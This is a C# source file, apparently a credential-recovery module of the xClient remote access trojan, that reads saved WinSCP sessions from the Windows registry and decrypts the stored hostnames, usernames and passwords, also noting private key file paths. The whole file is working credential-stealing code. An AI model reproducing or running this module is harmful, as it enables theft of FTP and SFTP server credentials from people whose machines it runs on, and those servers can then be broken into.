using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Data;

namespace xClient.Core.Recovery.FtpClients
{
    public class WinSCP
    {
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            List<RecoveredAccount> data = new List<RecoveredAccount>();
            try
            {
                string RegKey = @"SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";
                using (Microsoft.Win32.RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKey))
                {
                    foreach (String subkeyName in key.GetSubKeyNames())
                    {
                        if (Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "HostName", null) != null)
                        {
                            string Host = Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "HostName", "").ToString();
                            string User = Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "UserName", "").ToString();
                            string Password = WinSCPDecrypt(User, Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "Password", "").ToString(), Host);
                            if ((Password == string.Empty) && ((Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "PublicKeyFile", null) != null)))
                                Password = "[PRIVATE KEY AT " + Uri.UnescapeDataString(Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "PublicKeyFile", null).ToString()) + "]";
                            data.Add(new RecoveredAccount
                            {
                                URL = Host,
                                Username = User,
                                Password = Password,
                                Application = "WinSCP"
                            });
                        }
                    }
                }
                return data;
            }
            catch
            {
                return data;
            }
        }

        static int dec_next_char(List<string> list)
        {
            int a = int.Parse(list[0]);
            int b = int.Parse(list[1]);
            int f = (255 ^ (((a << 4) + b) ^ 0xA3) & 0xff);
            return f;
        }
        static string WinSCPDecrypt(string user, string pass, string host)
        {
            try
            {
                if (user == string.Empty || pass == string.Empty || host == string.Empty)
                {
                    return "";
                }
                string qq = pass;
                List<string> HashList = new List<string>();
                foreach (char keyf in qq)
                    HashList.Add(keyf.ToString());
                List<string> NewHashList = new List<string>();
                for (int i = 0; i < HashList.Count; i++)
                {
                    if (HashList[i] == "A")
                        NewHashList.Add("10");
                    if (HashList[i] == "B")
                        NewHashList.Add("11");
                    if (HashList[i] == "C")
                        NewHashList.Add("12");
                    if (HashList[i] == "D")
                        NewHashList.Add("13");
                    if (HashList[i] == "E")
                        NewHashList.Add("14");
                    if (HashList[i] == "F")
                        NewHashList.Add("15");
                    if ("ABCDEF".IndexOf(HashList[i]) == -1)
                        NewHashList.Add(HashList[i]);
                }
                List<string> NewHashList2 = NewHashList;
                int length = 0;
                if (dec_next_char(NewHashList2) == 255)
                    length = dec_next_char(NewHashList2);
                NewHashList2.Remove(NewHashList2[0]);
                NewHashList2.Remove(NewHashList2[0]);
                NewHashList2.Remove(NewHashList2[0]);
                NewHashList2.Remove(NewHashList2[0]);
                length = dec_next_char(NewHashList2);
                List<string> NewHashList3 = NewHashList2;
                NewHashList3.Remove(NewHashList3[0]);
                NewHashList3.Remove(NewHashList3[0]);
                int todel = dec_next_char(NewHashList2) * 2;
                for (int i = 0; i < todel; i++)
                {
                    NewHashList2.Remove(NewHashList2[0]);
                }
                string password = "";
                for (int i = -1; i < length; i++)
                {
                    string data = ((char)dec_next_char(NewHashList2)).ToString();
                    NewHashList2.Remove(NewHashList2[0]);
                    NewHashList2.Remove(NewHashList2[0]);
                    password = password + data;
                }
                string splitdata = user + host;
                int len = password.Length - 1;
                int sp = password.IndexOf(splitdata);
                password = password.Remove(0, sp);
                password = password.Replace(splitdata, "");
                return password;

            }
            catch
            {
                return "";
            }
        }
    }
}
